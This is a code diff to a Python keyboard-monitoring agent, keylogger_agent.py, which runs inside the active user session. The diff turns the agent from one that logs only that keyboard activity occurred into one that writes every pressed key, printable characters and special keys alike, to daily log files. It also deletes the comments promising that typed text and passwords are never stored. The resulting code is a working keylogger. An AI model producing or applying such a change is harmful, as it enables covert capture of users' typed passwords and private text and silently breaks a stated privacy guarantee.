@@ -5,8 +5,9 @@ This process is spawned by KeyboardMonitor into the active interactive
 user session so that pynput can receive keyboard activity.
 
 IMPORTANT:
-    This agent records only the fact that keyboard activity occurred.
-    It does NOT store key names, characters, typed text, passwords, etc.
+    This agent records pressed keys using printable characters for normal
+    keys and bracketed names such as ``[space]`` or ``[enter]`` for
+    special keys.
 
 Usage:
     python keylogger_agent.py <keyboard_root_dir> <diagnostic_log_file>
@@ -20,6 +21,7 @@ from datetime import datetime
 from pathlib import Path
 
 from pynput import keyboard
+from monitoring.utils import format_logged_key
 
 
 AGENT_NAME = "keyboard_agent"
@@ -130,20 +132,20 @@ def write_activity_event(
     keyboard_dir: str,
     logger: logging.Logger,
     write_lock: threading.Lock,
+    key,
 ) -> None:
     """
-    Write one generic keyboard activity event.
-
-    No key character/name/content is stored.
+    Write one keyboard event.
     """
 
     now = datetime.now()
 
     log_file = get_daily_log_file(keyboard_dir)
+    logged_key = format_logged_key(key)
 
     entry = (
         f"{now.isoformat(timespec='seconds')} "
-        f"keyboard activity\n"
+        f"{logged_key}\n"
     )
 
     try:
@@ -283,25 +285,16 @@ def main() -> None:
     # Keyboard callback
     # ------------------------------------------------------------------
 
-    def on_press(_key) -> None:
+    def on_press(key) -> None:
         """
-        Handle keyboard activity.
-
-        IMPORTANT:
-            _key is intentionally ignored.
-
-        We do NOT read:
-            key.char
-            key.name
-            str(key)
-
-        Therefore typed content is never stored.
+        Handle keyboard input.
         """
 
         write_activity_event(
             keyboard_dir=keyboard_dir,
             logger=logger,
             write_lock=write_lock,
+            key=key,
         )
 
     # ------------------------------------------------------------------
